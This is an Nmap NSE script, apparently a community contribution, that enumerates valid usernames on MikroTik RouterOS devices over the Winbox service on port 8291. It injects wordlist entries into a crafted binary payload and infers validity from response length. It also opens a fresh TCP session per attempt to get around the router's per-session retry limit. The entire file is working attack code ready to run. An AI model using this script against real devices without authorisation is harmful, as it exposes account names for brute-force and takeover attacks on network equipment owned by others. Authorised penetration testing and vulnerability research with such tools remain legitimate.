description = [[
Attempts to enumerate valid usernames on MikroTik devices running the Winbox service on port 8291 in MikroTik-RouterOS.
This script takes a wordlist from the user and modifies a baseline payload by adding the username to it. If the server responds with 35 bytes, the username is invalid; if the response is 51 bytes, the username is valid.
]]

author = "deauther890"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "discovery"}

--@usage

--sudo nmap -p 8291 --script mikrotik-routeros-usernames-enum.nse  --script-args=mikrotik_user_enum.wordlist=<wordlist path>  <target>

--@Note

-- THis script uses a new tcp session for every username because the router doesn't respond to usernames after sending 3 tries within the same tcp session!

-- Import required libraries
local shortport = require "shortport"
local nmap = require "nmap"
local stdnse = require "stdnse"
local string = require "string"

-- Define the port rule
portrule = shortport.portnumber(8291, "tcp")

-- Define the Driver for socket handling
Driver = {
  new = function(self, host, port, options)
    local o = { host = host, port = port, options = options }
    setmetatable(o, self)
    self.__index = self
    return o
  end,

  connect = function(self)
    self.s = nmap.new_socket()
    self.s:set_timeout(self.options['timeout'] or 5000)
    return self.s:connect(self.host, self.port, "tcp")
  end,

  send_payload = function(self, payload)
    local try = nmap.new_try(function() return false end)
    try(self.s:send(payload))
    return try(self.s:receive_bytes(1024)) -- Receive up to 1024 bytes
  end,

  disconnect = function(self)
    if self.s then
      self.s:close()
    end
  end,
}

-- Read usernames from a wordlist file provided by the user
local function read_wordlist(file_path)
  local wordlist = {}
  local f, err = io.open(file_path, "r")

  if not f then
    stdnse.print_debug("Error opening wordlist: %s", err)
    return nil
  end

  for line in f:lines() do
    table.insert(wordlist, line:match("^%s*(.-)%s*$")) -- Remove leading and trailing whitespaces
  end

  f:close()
  return wordlist
end

-- Function to create the payload
local function create_payload(base_payload, username)
  local length = #username
  local first_byte = string.char(0x22 + length) -- Increment the first byte
  return first_byte .. base_payload:sub(2, 2) .. username .. base_payload:sub(3)

end

-- Main action function
action = function(host, port)
  local wordlist_path = stdnse.get_script_args("mikrotik_user_enum.wordlist")
  if not wordlist_path then
    return "No wordlist provided. Use --script-args=mikrotik_user_enum.wordlist=<file>"
  end

  local usernames = read_wordlist(wordlist_path)
  if not usernames then
    return "Failed to read the wordlist."
  end

  local base_payload = "\x22\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  local valid_usernames = {}

  local options = { timeout = 5000 }
  local driver = Driver:new(host, port, options)

  if not driver:connect() then
    return "Failed to connect to the target."
  end

  for _, username in ipairs(usernames) do
  -- Terminate the current connection and attempt to reconnect
  driver:disconnect()
  if not driver:connect() then
    stdnse.print_debug("Failed to reconnect for username: %s", username)
    stdnse.sleep(0.5)
  else
    local payload = create_payload(base_payload, username)
    stdnse.print_debug("Sending payload for username: %s", username)
    local success, response = pcall(driver.send_payload, driver, payload)
    if success and response then
      local response_length = #response
      stdnse.print_debug("Response length for username %s: %d", username, response_length)
      if response_length == 51 then
        table.insert(valid_usernames, username)
      end
    end
    stdnse.sleep(0.5) -- Delay between requests
  end
end


  driver:disconnect()

  if #valid_usernames > 0 then
    return "Valid usernames found: " .. table.concat(valid_usernames, ", ")
  else
    return "No valid usernames found."
  end
end

